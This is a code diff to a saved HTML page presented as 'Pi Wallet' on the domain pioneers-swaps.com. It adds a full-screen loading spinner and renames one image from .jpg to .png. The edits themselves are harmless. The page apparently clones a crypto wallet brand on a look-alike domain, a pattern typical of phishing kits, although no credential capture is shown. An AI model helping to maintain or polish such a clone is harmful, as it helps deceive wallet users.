@@ -36,7 +36,7 @@
 <link rel="preload" as="image" href="extracted_images/img_19_64fce405.png">
 <link rel="preload" as="image" href="extracted_images/img_20_6004c91f.png">
 <link rel="preload" as="image" href="extracted_images/img_21_551d9ec4.png">
-<link rel="preload" as="image" href="extracted_images/img_22_250ee191.jpg">
+<link rel="preload" as="image" href="extracted_images/img_22_250ee191.png">
 <link rel="preload" as="image" href="extracted_images/img_24_ad61b490.jpg">
 <style>:root{--sf-img-28: url("extracted_images/img_1_029027dd.jpg")}*{-webkit-text-size-adjust:100%;-moz-text-size-adjust:100%;-ms-text-size-adjust:100%;text-size-adjust:100%}</style>
 
@@ -51,7 +51,22 @@
 <style id=wp-custom-css>.login span{text-transform:capitalize;font-style:normal;font-weight:bold!important;font-family:"Montserrat",sans-serif}.text-form p{font-size:0.875em}</style>
 <style id=egf-frontend-styles>p{font-family:"Montserrat",sans-serif;font-style:normal;font-weight:400}</style>
 <meta name=referrer content=no-referrer><link rel="shortcut icon" href="extracted_images/img_2_99adb8db.ico"><style>.sf-hidden{display:none!important}</style><link rel=canonical href="https://pioneers-swaps.com/?a=validates"><meta http-equiv=content-security-policy content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"><noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost%3Aregular%2C700%2Cregular%2Cregular%2Cregular&amp;display=swap"></noscript></head>
+<style>
+#pi-loader{position:fixed;inset:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px}
+#pi-loader svg{animation:pi-spin 1.1s linear infinite}
+@keyframes pi-spin{to{transform:rotate(360deg)}}
+#pi-loader p{font-family:'Mulish',sans-serif;font-size:14px;color:#703d92;font-weight:600;margin:0}
+body.pi-ready #pi-loader{display:none}
+body:not(.pi-ready){overflow:hidden}
+</style>
 <body>
+<div id=pi-loader>
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" fill="none" width="56" height="56"><path fill="#703d92" d="M94.91 66.314c0-1.078.875-1.953 1.954-1.953h18.878c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953H96.863a1.953 1.953 0 0 1-1.953-1.953V66.314ZM133.97 66.314c0-1.078.875-1.953 1.953-1.953h18.879c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953h-18.879a1.953 1.953 0 0 1-1.953-1.953V66.314Z"/><path fill="#703d92" d="M94.91 115.616v77.765l22.785 8.992v-86.757h16.275v77.765l22.785 8.992v-86.757h15.14c12.491 0 22.618-10.234 22.618-22.858V79.985h-22.618v12.773H80.422c-12.492 0-22.618 10.234-22.618 22.858v15.798h22.618v-15.798h14.489Z"/><path fill="#703d92" fill-rule="evenodd" d="M130.122 20.75c-60.368 0-109.305 48.937-109.305 109.305 0 60.367 48.937 109.305 109.305 109.305 60.367 0 109.305-48.938 109.305-109.305 0-60.368-48.938-109.305-109.305-109.305ZM.943 130.055C.943 58.711 58.778.875 130.122.875c71.343 0 129.178 57.836 129.178 129.18 0 71.343-57.835 129.178-129.178 129.178C58.778 259.233.943 201.398.943 130.055Z" clip-rule="evenodd"/></svg>
+  <p>Loading...</p>
+</div>
+<script>
+window.addEventListener('load',function(){document.body.classList.add('pi-ready');});
+</script>
  <div class=wrapper>
  <div class=header>
  <div class=header-content>
@@ -209,7 +224,7 @@ Pi Wallet is the secure hub for your Pi transactions, providing an intuitive int
 <div class=set>
  <div class=set1>
  <a href="swap/">
- <center> <div class="swap-wrapper"><img src="extracted_images/img_22_250ee191.jpg" width=70><span class="new-badge">New</span></div>
+ <center> <div class="swap-wrapper"><img src="extracted_images/img_22_250ee191.png" width=70><span class="new-badge">New</span></div>
  <p class=set2> Swap </p>
  </center>
  </a>
